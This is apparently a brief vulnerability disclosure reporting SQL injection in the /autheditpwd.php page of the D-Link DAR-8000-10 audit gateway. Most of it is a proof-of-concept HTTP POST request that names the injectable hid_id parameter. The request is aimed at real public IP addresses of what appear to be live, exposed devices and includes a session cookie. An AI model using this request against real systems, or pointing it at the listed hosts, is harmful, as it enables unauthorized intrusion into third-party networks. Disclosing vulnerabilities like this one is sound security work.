
The full version of the D-LINK DAR-8000-10 series online behavior audit gateway has an SQL injection vulnerability. Attackers can exploit vulnerabilities to gain server privileges or cause business impact on the system.


official： http://www.dlink.com.cn/

version:DAR-8000-10

Vulnerability Path ：/autheditpwd.php
https://59.60.19.174:8443/
<img width="723" alt="图片" src="https://github.com/llixixi/cve/assets/144869546/7a5d33a9-90c1-4688-9877-7fa9bf658ef8">
poc：
```
POST /autheditpwd.php? HTTP/1.1
Host: 58.18.133.60:8443
Cookie: PHPSESSID=8ad3e9e30c1d494aba55072f78549c04
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: https://58.18.133.60:8443
Referer: https://58.18.133.60:8443/autheditpwd.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

oldpwd=1&pwd=1&confirmpwd=1&mode=edit&hid_id=

```
<img width="727" alt="图片" src="https://github.com/llixixi/cve/assets/144869546/2aabdb7a-9880-42f0-8bc2-42e7d8cfcf50">

